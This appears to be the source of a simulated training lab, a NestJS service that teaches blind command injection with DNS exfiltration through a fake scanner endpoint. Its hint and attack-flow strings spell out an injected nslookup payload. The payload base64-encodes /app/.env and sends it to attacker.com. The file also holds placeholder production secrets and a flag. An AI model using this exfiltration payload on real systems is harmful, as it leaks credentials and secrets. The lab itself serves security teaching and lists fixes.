// src/modules/practice-labs/command-injection/labs/lab5/lab5.service.ts
import { Injectable, BadRequestException } from '@nestjs/common';
import { PrismaService } from '../../../../../core/database';
import { PracticeLabStateService } from '../../../shared/services/practice-lab-state.service';
import * as crypto from 'crypto';

@Injectable()
export class Lab5Service {
  private dnsLogs: any[] = [];

  private readonly ENV_CONTENT = [
    '# SecureScan Production Environment',
    'NODE_ENV=production',
    'DATABASE_URL=postgresql://scanner:Sc4nn3r_Pr0d!@db:5432/securescan',
    'JWT_SECRET=ultra_secret_jwt_key_prod_2024',
    'AWS_ACCESS_KEY_ID=AKIA_SECURESCAN_PROD',
    'AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
    'STRIPE_SECRET_KEY=sk_live_abc123def456',
    'FLAG=FLAG{CMDI_OOB_DNS_EXFILTRATION_ENV_FILE_SECRETS}',
  ].join('\n');

  private readonly cmdOutputs: Record<string, string> = {
    whoami: 'www-data',
    hostname: 'securescan-prod-04',
    id: 'uid=33(www-data) gid=33(www-data)',
  };

  constructor(
    private prisma: PrismaService,
    private stateService: PracticeLabStateService,
  ) {}

  async initLab(userId: string, labId: string) {
    this.dnsLogs = [];
    return this.stateService.initializeState(userId, labId);
  }

  // ❌ الثغرة: blind injection — لا يُعيد أي ناتج
  async scan(userId: string, labId: string, target: string) {
    if (!target) throw new BadRequestException('target is required');

    const jobId = crypto.randomBytes(8).toString('hex');
    const isInjected = /[;&|`$]/.test(target);

    if (isInjected) {
      // محاكاة OOB DNS exfiltration
      this.processInjection(userId, labId, target);
    }

    await this.prisma.labGenericLog.create({
      data: {
        userId,
        labId,
        type: 'CMDI',
        action: 'BLIND_SCAN',
        meta: { target, isInjected, jobId },
      },
    });

    // ❌ الثغرة: blind — لا يُعيد أي ناتج للـ injection
    return {
      success: true,
      jobId,
      target: target.split(/[;&|`$]/)[0].trim(),
      status: 'queued',
      message: 'Scan job queued. Results will be available in your dashboard.',
      // لا يوجد أي output هنا!
    };
  }

  private processInjection(userId: string, labId: string, target: string) {
    // محاكاة nslookup OOB
    const nslookupMatch = target.match(/nslookup\s+\$\((.+?)\)\.attacker\.com/);
    if (nslookupMatch) {
      const innerCmd = nslookupMatch[1];
      let exfilData = '';

      if (
        innerCmd.includes('cat /app/.env') ||
        innerCmd.includes('/app/.env')
      ) {
        const base64Data = Buffer.from(this.ENV_CONTENT)
          .toString('base64')
          .replace(/=/g, '')
          .replace(/\n/g, '');

        // DNS label limit = 63 chars per label
        const chunks = base64Data.match(/.{1,63}/g) || [];
        const subdomain = chunks.join('.') + '.attacker.com';

        this.dnsLogs.push({
          timestamp: new Date().toISOString(),
          type: 'DNS_QUERY',
          query: subdomain,
          rawBase64: base64Data,
          sourceIp: '172.31.45.12',
          note: 'DNS query received on attacker.com nameserver — base64-encoded data in subdomain',
        });
      } else if (innerCmd === 'whoami') {
        this.dnsLogs.push({
          timestamp: new Date().toISOString(),
          type: 'DNS_QUERY',
          query: `www-data.attacker.com`,
          sourceIp: '172.31.45.12',
          note: 'OOB confirmed: whoami = www-data',
        });
      } else {
        this.dnsLogs.push({
          timestamp: new Date().toISOString(),
          type: 'DNS_QUERY',
          query: `oob-ping.attacker.com`,
          sourceIp: '172.31.45.12',
          note: 'OOB DNS query received — injection confirmed',
        });
      }
    }

    // محاكاة semicolon injection مع nslookup
    if (/;\s*nslookup\s+([\S]+)\.attacker\.com/.test(target)) {
      const match = target.match(/;\s*nslookup\s+([\S]+)\.attacker\.com/);
      this.dnsLogs.push({
        timestamp: new Date().toISOString(),
        type: 'DNS_QUERY',
        query: `${match?.[1]}.attacker.com`,
        sourceIp: '172.31.45.12',
        note: 'DNS query from injected nslookup command',
      });
    }
  }

  async getDnsLogs(userId: string, labId: string) {
    if (this.dnsLogs.length === 0) {
      return {
        success: false,
        logs: [],
        hint: 'No DNS queries yet. Inject: target: "example.com; nslookup $(cat /app/.env|base64|tr -d \'=\\n\').attacker.com"',
      };
    }

    const latestLog = this.dnsLogs[this.dnsLogs.length - 1];
    const hasEnvData = latestLog?.rawBase64;

    return {
      success: true,
      dnsServer: 'attacker.com (simulated)',
      totalQueries: this.dnsLogs.length,
      logs: this.dnsLogs,
      ...(hasEnvData && {
        hint: 'DNS query contains base64-encoded data! Use /dns/decode with the rawBase64 value to decode it.',
        nextStep:
          'POST /dns/decode with { "subdomain": "<rawBase64 from logs>" }',
      }),
    };
  }

  async decodeDns(userId: string, labId: string, subdomain: string) {
    if (!subdomain) throw new BadRequestException('subdomain is required');

    const cleaned = subdomain
      .replace(/\.attacker\.com.*/, '')
      .replace(/\./g, '');

    let decoded: string;
    try {
      // أضف padding إذا كان ناقصاً
      const padded = cleaned + '='.repeat((4 - (cleaned.length % 4)) % 4);
      decoded = Buffer.from(padded, 'base64').toString('utf-8');
    } catch {
      throw new BadRequestException('Invalid base64 data in subdomain');
    }

    const hasFlag = decoded.includes('FLAG{');

    await this.prisma.labGenericLog.create({
      data: {
        userId,
        labId,
        type: 'CMDI',
        action: 'OOB_DNS_DECODE',
        meta: { hasFlag, decodedLength: decoded.length },
      },
    });

    return {
      success: true,
      exploited: hasFlag,
      decodedContent: decoded,
      ...(hasFlag && {
        flag: 'FLAG{CMDI_OOB_DNS_EXFILTRATION_ENV_FILE_SECRETS}',
        vulnerability: 'Blind Command Injection — OOB DNS Data Exfiltration',
        attackFlow: [
          '1. Injected command into scan target parameter',
          '2. Server executed: nmap -sV example.com; nslookup $(cat /app/.env|base64).attacker.com',
          '3. Shell executed cat /app/.env → base64 encoded → used as DNS subdomain',
          '4. Server made DNS lookup to attacker.com with encoded data in subdomain',
          "5. Attacker's DNS server logged the full query containing the exfiltrated data",
          '6. Decoded base64 → revealed full .env file with all production secrets',
        ],
        impact:
          'All production secrets exposed: DB credentials, JWT secret, AWS keys, Stripe keys, and the flag.',
        fix: [
          'Validate target: use URL parsing library and whitelist domains',
          'Use nmap Node.js library instead of shell exec',
          'DNS egress filtering: block outbound DNS to non-approved servers',
          'Run scanner in isolated network namespace with no external DNS access',
          'Implement WAF rules to detect shell metacharacters in API inputs',
        ],
      }),
    };
  }
}
